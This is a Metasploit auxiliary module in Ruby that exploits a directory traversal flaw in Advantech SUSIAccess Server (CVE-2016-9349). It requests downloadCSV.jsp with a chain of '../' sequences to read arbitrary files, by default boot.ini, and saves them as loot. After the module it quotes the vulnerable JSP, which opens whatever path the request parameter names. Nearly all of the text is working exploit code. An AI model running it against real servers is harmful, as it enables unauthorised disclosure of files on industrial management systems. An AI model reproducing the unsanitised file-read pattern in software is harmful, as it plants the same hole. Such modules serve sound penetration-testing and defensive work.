 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Advantech SUSIAccess Server Directory Traversal Information Disclosure&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an information disclosure vulnerability found in
                Advantech SUSIAccess <= version 3.0. The vulnerability is triggered when
                sending a GET request to the server with a series of dot dot slashes (../)
                in the file parameter. 
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2016-9349&#039; ],
                    [ &#039;ZDI&#039;, &#039;16-628&#039; ],
                    [ &#039;BID&#039;, &#039;94629&#039; ],
                    [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-16-336-04&#039; ]
                ],
            &#039;DisclosureDate&#039; => &#039;Dec 13 2016&#039;))
 
        register_options(
            [
                OptInt.new(&#039;DEPTH&#039;, [ false, &#039;Levels to reach base directory&#039;, 10]),
                OptString.new(&#039;FILE&#039;, [ false, &#039;This is the file to download&#039;, &#039;boot.ini&#039;]),
                Opt::RPORT(8080)
            ], self.class )
    end
 
    def run
 
    depth = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "/" + ("../" * depth)
 
    file = "#{levels}#{datastore[&#039;FILE&#039;]}"
    file = file.gsub(/ /, "%20")
 
    res = send_request_raw({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "/downloadCSV.jsp?file=#{file}",
    })
 
    if res and res.code == 200
        loot = res.body
        if not loot or loot.empty?
            print_status("File from #{rhost}:#{rport} is empty...")
            return
        end
        file = ::File.basename(datastore[&#039;FILE&#039;])
        path = store_loot(&#039;advantech_susiaccess.file&#039;, &#039;application/octet-stream&#039;, rhost, loot, file, datastore[&#039;FILE&#039;])
        print_status("Stored #{datastore[&#039;FILE&#039;]} to #{path}")
        return
    else
        print_error("Something went wrong... Application returned a #{res.code}")
    end
 
    end
end
__END__
<%@ page import="java.util.*,java.io.*" %>               
<%
 File f = new File (getServletContext().getRealPath("/") + request.getParameter("file") );
 //set the content type(can be excel/word/powerpoint etc..)
 response.setContentType ("application/csv");
 //set the header and also the Name by which user will be prompted to save
 response.setHeader ("Content-Disposition", "attachment; filename=\""+request.getParameter("file").split("/")[2] +"\"");
  
 //get the file name
 String name = f.getName().substring(f.getName().lastIndexOf("/") + 1,f.getName().length());
 //OPen an input stream to the file and post the file contents thru the 
 //servlet output stream to the client m/c
  
  InputStream in = new FileInputStream(f);
  ServletOutputStream outs = response.getOutputStream();
   
   
  int bit = 256;
  int i = 0;
  try {
   while ((bit) >= 0) {
    bit = in.read();
    outs.write(bit);
   }
   //System.out.println("" +bit);
  } catch (IOException ioe) {
   ioe.printStackTrace(System.out);
  }
//  System.out.println( "n" + i + " bytes sent.");
//  System.out.println( "n" + f.length() + " bytes sent.");
  outs.flush();
  outs.close();
  in.close(); 
 
%>

